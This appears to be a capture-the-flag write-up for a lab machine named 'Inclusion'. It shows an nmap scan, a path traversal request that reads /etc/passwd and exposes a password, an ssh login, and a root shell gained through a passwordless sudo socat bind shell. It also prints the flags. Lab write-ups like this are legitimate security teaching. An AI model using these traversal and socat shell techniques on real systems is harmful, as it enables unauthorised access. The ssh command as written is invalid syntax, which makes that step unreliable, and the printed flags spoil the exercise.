# Inclusion

### #1 User flag
Get the open ports using nmap
```
nmap -sV -sC <ip>

PORT      STATE    SERVICE  VERSION
22/tcp    open     ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e6:3a:2e:37:2b:35:fb:47:ca:90:30:d2:14:1c:6c:50 (RSA)
|   256 73:1d:17:93:80:31:4f:8a:d5:71:cb:ba:70:63:38:04 (ECDSA)
|_  256 d3:52:31:e8:78:1b:a6:84:db:9b:23:86:f0:1f:31:2a (ED25519)
80/tcp    open     http     Werkzeug httpd 0.16.0 (Python 3.6.9)
|_http-server-header: Werkzeug/0.16.0 Python/3.6.9
|_http-title: My blog
```
In the webpage we can use the ?name to print out files as root
```
http://<ip>/article?name=../../../etc/passwd
```

We find the user falconfeast and his password
```
falconfeast:x:1000:1000:falconfeast,,,:/home/falconfeast:/bin/bash #falconfeast:rootpassword 
```

Login to ssh using the username and password 
```
ssh falconfeast:rootpassword@<ip>
```
Cat out the user flag
```
cat /home/falconfeast/user.txt
60989655118397345799
```

### #2 Root flag  
Check if there is anything we can execute as root without using password 
```
sudo -l
(root) NOPASSWD: /usr/bin/socat
```
Exploit socat
```
sudo socat TCP4-LISTEN:1234,reuseaddr EXEC:"/bin/sh"
```
Connect to the listener
```
socat - TCP4:<ip>:1234
```
Cat out the root flag
```
cat /root/root.txt
42964104845495153909
```
